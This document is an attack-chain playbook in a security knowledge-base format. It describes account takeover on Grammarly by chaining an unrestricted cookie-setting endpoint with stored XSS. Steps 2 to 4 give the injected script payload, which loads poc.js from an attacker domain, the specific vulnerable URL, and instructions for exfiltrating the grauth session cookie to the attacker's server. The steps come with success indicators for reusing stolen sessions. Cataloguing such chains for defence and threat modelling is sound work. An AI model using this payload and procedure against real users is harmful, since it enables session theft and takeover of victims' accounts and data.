---
tags:
  - xss
  - cookie-manipulation
  - account-takeover
  - javascript
  - web-exploit
type: attack_chain
tools:
  - '[[tools/jQuery-for-Cross-Domain-AJAX]]'
  - '[[tools/XMLHttpRequest-for-Credentialed-Requests]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
  - '[[Lateral Movement]]'
commands:
  - '[[commands/access-grammarly-document-with-stolen-cookies]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
procedures:
  - '[[procedures/Host-Malicious-Webpage-for-Cookie-Manipulation]]'
  - '[[procedures/Set-Malicious-gnar_containerId-Cookie-via-POST-Endpoint]]'
  - '[[procedures/Redirect-Victim-to-Trigger-Stored-XSS-on-Grammarly]]'
  - '[[procedures/Inject-Script-to-Steal-Session-Cookies-via-XSS]]'
  - '[[procedures/Use-Stolen-Cookies-for-Grammarly-Account-Takeover]]'
step_count: 5
techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
  - '[[Valid Accounts]]'
description: >-
  A multi-stage attack exploiting an unrestricted cookie-setting endpoint and a
  stored XSS vulnerability to steal session cookies and achieve account takeover
  on Grammarly.
skill_level: intermediate
impact_level: high
id: 1bb134b8-d1bf-459a-a1a9-8c5749cfe458
created_at: '2025-12-14T17:33:34.382Z'
updated_at: '2025-12-14T17:33:34.382Z'
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
  - '[[Valid Accounts]]'
---
# Account Takeover via Unrestricted Cookie Manipulation and Stored XSS on Grammarly

Multi-stage attack chain demonstrating a complete attack workflow exploiting vulnerabilities in Grammarly's cookie handling and XSS reflection to steal session cookies and take over user accounts.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~2 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Host Malicious Page] --> B[Set Malicious Cookie]
    B --> C[Redirect to Grammarly]
    C --> D[Trigger XSS and Steal Cookies]
    D --> E[Account Takeover]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/jQuery-for-Cross-Domain-AJAX]]
- [[tools/XMLHttpRequest-for-Credentialed-Requests]]

### Target Environment

- Web platform (HTTPS-enabled)
- Access to host a malicious webpage over HTTPS
- Victim interaction required (e.g., via phishing link)

### Initial Access Requirements

- No prior credentials needed
- Network access to gnar.grammarly.com and www.grammarly.com
- Victim must visit the attacker's malicious page while authenticated to Grammarly

## Detailed Attack Procedures

### Step 1: Host Malicious Webpage
procedure: [[procedures/Host-Malicious-Webpage-for-Cookie-Manipulation]]

**Objective**: Serve a webpage that initiates cookie manipulation without triggering mixed-content warnings.

**Instructions**: Host an HTML file (e.g., Grammarly.html) over HTTPS containing JavaScript to set cookies and redirect the victim.

**Expected Output**: Victim loads the page, JavaScript executes without errors.

**Success Indicators**:
- Page loads successfully over HTTPS
- No browser warnings about mixed content

### Step 2: Set Malicious Cookie
procedure: [[procedures/Set-Malicious-gnar_containerId-Cookie-via-POST-Endpoint]]

**Objective**: Use JavaScript to POST a payload to the unrestricted /cookies endpoint, injecting XSS payload into the gnar_containerId cookie.

**Instructions**: The script uses jQuery to send a POST request to https://gnar.grammarly.com/cookies with the payload '</noscript><script src="https://<YOUR_DOMAIN_NAME>/poc.js"></script><noscript>' encoded as the cookie value, setting maxAge to a long duration.

**Expected Output**: Cookie set successfully; confirmed via browser dev tools.

**Success Indicators**:
- gnar_containerId cookie contains the injected payload
- No CORS or authentication errors in console

### Step 3: Redirect to Vulnerable Page
procedure: [[procedures/Redirect-Victim-to-Trigger-Stored-XSS-on-Grammarly]]

**Objective**: Redirect the victim to www.grammarly.com where the cookie is reflected unsanitized in a noscript tag, triggering XSS.

**Instructions**: Execute window.location.replace('https://www.grammarly.com/upgrade?utm_source=upHook&app_type=app&page=free&utm_campaign=editorMenu&utm_medium=internal') to load the page that reflects the cookie.

**Expected Output**: Page loads, XSS payload executes, loading poc.js.

**Success Indicators**:
- Victim redirected to Grammarly
- poc.js script loads and runs in victim's context

### Step 4: Steal Session Cookies
procedure: [[procedures/Inject-Script-to-Steal-Session-Cookies-via-XSS]]

**Objective**: The injected script queries the /cookies endpoint to retrieve sensitive cookies like grauth and exfiltrates them to the attacker's server.

**Instructions**: poc.js uses XMLHttpRequest to GET https://gnar.grammarly.com/cookies?name=grauth with credentials, then sends the response to https://<YOUR_DOMAIN_NAME>/ + cookie_value.

**Expected Output**: grauth cookie value received and exfiltrated.

**Success Indicators**:
- Attacker's server logs the stolen cookie
- No errors in victim's browser console

### Step 5: Perform Account Takeover
procedure: [[procedures/Use-Stolen-Cookies-for-Grammarly-Account-Takeover]]

**Objective**: Use stolen cookies to impersonate the victim and access their account resources.

**Instructions**: Set the stolen grauth and csrf-token cookies in requests to Grammarly endpoints, such as using [[commands/access-grammarly-document-with-stolen-cookies]] to fetch documents.

**Expected Output**: HTTP 200 response with access to victim data.

**Success Indicators**:
- Successful access to victim's documents
- No authentication redirects (e.g., HTTP 301)

## Attack Chain Summary

### Key Achievements

1. Bypassed cookie restrictions to inject XSS payload
2. Executed arbitrary JavaScript in victim's authenticated session
3. Stolen session cookies enabling full account takeover

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Drive-by Compromise]]
- [[JavaScript]]
- [[Steal Web Session Cookie]]
- [[Valid Accounts]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]
- [[Collection]]
- [[Lateral Movement]]

---
*Last updated: 2023-10-01T00:00:00Z*
